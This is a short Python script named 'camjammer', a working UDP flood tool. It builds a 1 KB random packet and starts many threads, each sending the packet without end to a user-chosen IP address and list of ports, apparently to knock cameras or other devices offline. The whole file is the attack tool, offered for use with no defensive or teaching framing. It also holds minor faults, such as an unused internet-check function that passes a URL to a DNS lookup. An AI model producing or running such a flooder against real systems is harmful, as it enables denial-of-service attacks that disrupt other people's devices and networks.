import random
import threading
import argparse
import socket
import time
import sys

class color:

    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"

def internet():
    try:
        socket.gethostbyname("https://www.google.com")
        return True
    except Exception as e:
        print(e)
        return False
    
def logo():
    print(color.red+"Author:Murad islam")
    print(color.red+"too many thread can damage your device!!")
    print("\n")
    print(color.yellow + f""".:okOOOkdc'           'cdkOOOko:.                                                
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                              
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                             
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                            
  oOOOOOOOO.{color.red}+MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                            
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                            
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                            
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                            
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                             
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                              
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                               
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                                
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                                 
         ,kOl'M.OOOOOOOOOOOOO.M'{color.green}+Ok,                                                   
           :kk;.OOOOOOOOOOOOO.;Ok:                                                     
             ;kOOOOOOOOOOOOOOOk:                                                       
               ,xOOOOOOOOOOOx,                                                         
                 .lOOOOOOOl.                                                           
                    ,dOd,                                                              
                      . """)

class jam():
    def __init__(self):
        self.packet = bytes(random.getrandbits(8) for _ in range(1024))
        self.rsd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.rst = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def packet_send(self,ip, port):
        time.sleep(3)
        while True:
            self.rsd.sendto(self.packet, (str(ip), port))
            pct = str(self.packet)
            print(f"packet sent to {ip}:{port}" + color.red + pct[:40])
        
    def multiple_thread(self,ports, thread_num, ip):
        threads = []
        for prt in ports:
            for i in range(thread_num):
                thread = threading.Thread(target = self.packet_send, args=(ip, int(prt)))
                threads.append(thread)
                thread.start()
        
        for thread in threads:
            thread.join()


def main():
    
    aa = argparse.ArgumentParser(description="camjammer")
    aa.add_argument("--ip", "-ip", help="your ip address")
    aa.add_argument("--port", "-p", type=str, help="your port number for multiple port using comma for separate each other")
    aa.add_argument("--threat", "-t", type=int, help="threats //too many threats can damage your phone")

    arg = aa.parse_args()

    ip = arg.ip
    port = arg.port
    threat = arg.threat

    if ip and port:
        logo()
        all_port = port.split(",")
        jm = jam()
        jm.multiple_thread(all_port, thread_num=threat, ip=ip)



if __name__ == "__main__":
    main()